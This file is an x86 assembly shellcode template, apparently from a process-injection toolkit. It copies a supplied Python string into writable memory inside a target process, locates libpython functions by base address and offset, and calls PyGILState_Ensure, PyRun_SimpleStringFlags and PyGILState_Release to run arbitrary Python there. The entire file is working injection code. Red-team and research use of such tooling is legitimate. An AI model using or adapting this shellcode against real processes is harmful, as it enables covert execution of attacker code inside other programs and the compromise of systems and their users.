jmp execute_python_code_main

execute_python_code_main:
	
	// copy the Python string to arbitrary read/write memory
	mov edi, [VARIABLE:ARBITRARY_READ_WRITE_DATA_ADDRESS:VARIABLE]
	# set ESI to the address of the Python code string
	call execute_python_code_get_next
execute_python_code_get_next:
	pop esi
	add esi, 6
	jmp execute_python_code_copy_code

python_code:
	.ascii "[VARIABLE:pythoncode:VARIABLE]\0"

execute_python_code_copy_code:

	mov edi, [VARIABLE:ARBITRARY_READ_WRITE_DATA_ADDRESS:VARIABLE]
	add edi, 32
	push ecx
	mov ecx, [VARIABLE:pythoncode.length:VARIABLE]
	add ecx, 2												# null terminator
	rep movsb
	pop ecx
	// END: copy the Python string to arbitrary read/write memory

	// BEGIN: call PyGILState_Ensure() and store the handle it returns
	mov ebx, [BASEADDRESS:.+/(lib|)python[0-9\.so]+$:BASEADDRESS]
	add ebx, [RELATIVEOFFSET:PyGILState_Ensure:RELATIVEOFFSET]
	call ebx
	mov ebx, [VARIABLE:ARBITRARY_READ_WRITE_DATA_ADDRESS:VARIABLE]
	mov [ebx], eax
	// END: call PyGILState_Ensure()

	// BEGIN: call PyRun_SimpleString("arbitrary Python code here")
	push ebx
	sub esp, 0x8

	push 0x0
	mov edi, [VARIABLE:ARBITRARY_READ_WRITE_DATA_ADDRESS:VARIABLE]
	add edi, 32
	push edi
	mov ebx, [BASEADDRESS:.+/(lib|)python[0-9\.so]+$:BASEADDRESS]
	add ebx, [RELATIVEOFFSET:PyRun_SimpleStringFlags:RELATIVEOFFSET]
	call ebx
	add esp, 0x10
	pop ebx
	// END: call PyRun_SimpleString("arbitrary Python code here")
	
	// BEGIN: call PyGILState_Release(handle)
	sub esp, 0xc
	mov ebx, [VARIABLE:ARBITRARY_READ_WRITE_DATA_ADDRESS:VARIABLE]
	mov ebx, [ebx]
	push ebx
	mov ebx, [BASEADDRESS:.+/(lib|)python[0-9\.so]+$:BASEADDRESS]
	add ebx, [RELATIVEOFFSET:PyGILState_Release:RELATIVEOFFSET]
	call ebx
	add esp, 0x10
	// END: call PyGILState_Release(handle)

SHELLCODE_SECTION_DELIMITER






